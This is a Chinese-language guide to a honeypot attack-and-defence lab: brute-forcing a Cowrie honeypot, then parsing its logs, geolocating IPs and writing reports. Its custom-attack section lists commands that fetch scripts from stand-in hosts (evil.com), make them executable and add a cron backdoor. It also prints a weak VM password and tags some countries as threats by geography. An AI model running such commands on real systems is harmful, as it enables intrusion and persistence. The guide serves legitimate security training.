# 攻防演练使用指南

本指南说明如何使用攻击和防守工具完成一次完整的蜜罐攻防演练。

## 环境准备

### 1. 启动蜜罐虚拟机

```bash
# 使用 virt-manager 或 virsh 启动 Cowrie 蜜罐
sudo virsh start cowrie-honeypot

# 或使用原始 VirtualBox 镜像
VBoxManage startvm UbuntuCowrie
```

### 2. 确认网络连通性

```bash
# 从攻击机测试蜜罐是否可达（默认端口 2222）
nc -zv 192.168.122.123 2222

# 或使用 telnet
telnet 192.168.122.123 2222
```

## 完整攻防流程

### 阶段 1：模拟攻击（攻击方视角）

```bash
cd attack/

# 1. 检查攻击字典
cat payloads/common_creds.txt

# 2. 根据需要编辑字典（可选）
vim payloads/common_creds.txt

# 3. 启动攻击模拟
./simulate_attack.sh 192.168.122.123 2222

# 4. 等待攻击完成（约 2-5 分钟，取决于字典大小）
# 脚本会自动尝试暴力破解并执行侦察命令

# 5. 查看攻击日志
ls -lh logs/
cat logs/attack_*.log
```

**预期输出**：

- 终端实时显示登录尝试结果（成功/失败）
- 成功登录后自动执行 18 个侦察命令
- 生成详细日志文件

### 阶段 2：日志收集（蜜罐管理员）

登录到蜜罐虚拟机：

```bash
# SSH 登录到蜜罐（使用真实 SSH 端口 22，不是 Cowrie 的 2222）
ssh cowrie@192.168.122.123

# 或在虚拟机控制台直接登录
# 用户名: cowrie
# 密码: 123456
```

在蜜罐上查看 Cowrie 日志：

```bash
cd ~/cowrie/var/log/cowrie

# 查看最新日志
ls -lht

# 实时查看日志（可选）
tail -f cowrie.json | jq .

# 查看登录尝试
jq 'select(.eventid == "cowrie.login.failed" or .eventid == "cowrie.login.success")' cowrie.json

# 查看命令执行
jq 'select(.eventid == "cowrie.command.input")' cowrie.json | jq -r .input
```

### 阶段 3：日志分析（防守方视角）

**方式 A：在蜜罐上直接分析**

将防守工具复制到蜜罐：

```bash
# 在攻击机上
cd /path/to/gruop_work
scp -r defense/ cowrie@192.168.122.123:~/

# 在蜜罐上执行分析
ssh cowrie@192.168.122.123
cd defense/
./analyze_logs.sh ~/cowrie/var/log/cowrie
```

**方式 B：拉取日志到本地分析（推荐）**

```bash
# 在攻击机上
cd defense/

# 复制日志到本地
mkdir -p cowrie_logs
scp cowrie@192.168.122.123:~/cowrie/var/log/cowrie/cowrie.json cowrie_logs/

# 分析本地日志
./analyze_logs.sh cowrie_logs/
```

**分析过程**：

1. 脚本自动解析 Cowrie JSON 日志
2. 提取登录尝试、成功登录、命令执行记录
3. 对所有 IP 进行地理位置溯源（可能需要 2-5 分钟）
4. 生成统计数据和摘要报告
5. 生成详细的 Markdown 报告

### 阶段 4：报告查看

```bash
cd defense/reports/

# 查看最新报告目录
ls -lt | head -5

# 进入最新报告目录
cd analysis_20261026_*/  # 替换为实际时间戳
```

## 分析结果解读

### 1. 登录统计

```
总登录尝试: 24 次
  ├─ 失败: 18 次
  └─ 成功: 6 次
成功率: 25.00%
```

**解读**：

- 成功率 25% 是 Cowrie 的**随机认证机制**导致的
- Cowrie 默认配置下，任意凭据有一定概率被"接受"
- 这是蜜罐的特性，用于诱使攻击者继续操作

### 2. 高频凭据

```
TOP 10 用户名          TOP 10 密码
  6 次   root            5 次   admin
  5 次   admin           4 次   123456
  4 次   ubuntu          3 次   password
```

**解读**：

- `root` 是最常被攻击的账户
- `admin`、`123456`、`password` 是最常见弱密码
- 这些是真实攻击中的高频模式

### 3. 命令分析

```
TOP 10 命令
  15 次   whoami
  12 次   uname -a
  10 次   ls -la /root
   8 次   cat /etc/passwd
```

**解读**：

- **侦察阶段**：`whoami`、`uname` 确认系统信息
- **权限探测**：`ls /root` 探测是否有 root 权限
- **账户枚举**：`cat /etc/passwd` 查找其他账户
- **可疑行为**：如出现 `wget`、`curl`、`/tmp/*.sh` 则可能是下载恶意脚本

### 4. IP 溯源

```
攻击源 IP: 1.2.3.4
国家: 美国 (US)
ISP: Example Hosting
威胁等级: MEDIUM
标签: cloud, scanner
```

**解读**：

- **内网 IP**（192.168.*）：测试流量，威胁等级 LOW
- **云服务商 IP**：可能是被入侵的云主机，威胁等级 MEDIUM
- **高危地区 IP**（CN/RU/KP/IR）：自动标记 MEDIUM（仅地理位置，非歧视）
- **标签 scanner**：主机名包含 bot/scanner 关键词

## 常见问题

### Q1: 攻击脚本无法连接到蜜罐

**检查步骤**：

```bash
# 1. 确认蜜罐虚拟机在运行
sudo virsh list --all

# 2. 确认 IP 地址
sudo virsh domifaddr cowrie-honeypot

# 3. 确认端口开放
nc -zv 192.168.122.123 2222

# 4. 检查防火墙
sudo iptables -L -n | grep 2222
```

### Q2: 所有登录都失败

**可能原因**：

1. Cowrie 未正常运行
2. 端口被真实 sshd 占用
3. 凭据字典格式错误

**检查方法**：

```bash
# 在蜜罐上检查 Cowrie 状态
ssh cowrie@192.168.122.123
cd ~/cowrie
bin/cowrie status

# 查看 Cowrie 日志
tail -50 var/log/cowrie/cowrie.log
```

### Q3: IP 溯源失败

**可能原因**：

1. 攻击机无法访问互联网
2. ip-api.com 服务不可用
3. 触发了速率限制

**解决方法**：

```bash
# 1. 测试网络
curl -s "http://ip-api.com/json/8.8.8.8"

# 2. 使用缓存
./ip_tracker.py 8.8.8.8  # 第二次查询会使用缓存

# 3. 跳过 IP 溯源
# 编辑 analyze_logs.sh，注释掉 enrich_ips 调用
```

### Q4: 报告中文乱码

```bash
# 确认终端编码
echo $LANG

# 设置 UTF-8
export LANG=zh_CN.UTF-8
export LC_ALL=zh_CN.UTF-8

# 重新运行分析
./analyze_logs.sh
```

## 进阶玩法

### 1. 自定义攻击场景

编辑 `attack/simulate_attack.sh` 的 `ATTACK_COMMANDS` 数组：

```bash
ATTACK_COMMANDS=(
    "whoami"
    "wget http://malicious.example.com/malware.sh"  # 模拟下载恶意脚本
    "curl -o /tmp/backdoor.sh http://evil.com/bd.sh"
    "chmod +x /tmp/backdoor.sh"
    "crontab -l"  # 探测定时任务
    "echo '* * * * * /tmp/backdoor.sh' | crontab -"  # 尝试添加后门
)
```

### 2. 批量 IP 溯源

```bash
# 从多个日志中提取所有 IP
jq -r 'select(.src_ip != null) | .src_ip' cowrie_logs/*.json | sort -u > all_ips.txt

# 批量查询
./defense/ip_tracker.py --file all_ips.txt --json > all_ip_info.json

# 筛选高危 IP
jq '.[] | select(.threat_level == "high" or .threat_level == "medium")' all_ip_info.json
```

### 3. 时间序列分析

```bash
# 按小时统计登录尝试
jq -r 'select(.eventid == "cowrie.login.failed") | .timestamp' cowrie.json | \
    cut -c12-13 | sort | uniq -c

# 结果示例：
#  15 08   # 上午 8 点有 15 次尝试
#  42 14   # 下午 2 点有 42 次尝试
#  31 20   # 晚上 8 点有 31 次尝试
```

### 4. 可视化（可选）

使用 Python 生成图表：

```bash
# 安装依赖
pip install matplotlib pandas

# 生成图表（需要自己写脚本或使用 Jupyter Notebook）
python3 << 'EOF'
import json
import matplotlib.pyplot as plt
from collections import Counter

# 读取数据
with open('defense/reports/analysis_*/ip_enrichment.json') as f:
    ips = json.load(f)

# 统计国家分布
countries = Counter(ip['country'] for ip in ips if not ip['is_internal'])

# 绘制饼图
plt.figure(figsize=(10, 6))
plt.pie(countries.values(), labels=countries.keys(), autopct='%1.1f%%')
plt.title('攻击源地理分布')
plt.savefig('attack_sources.png')
print("图表已保存到 attack_sources.png")
EOF
```
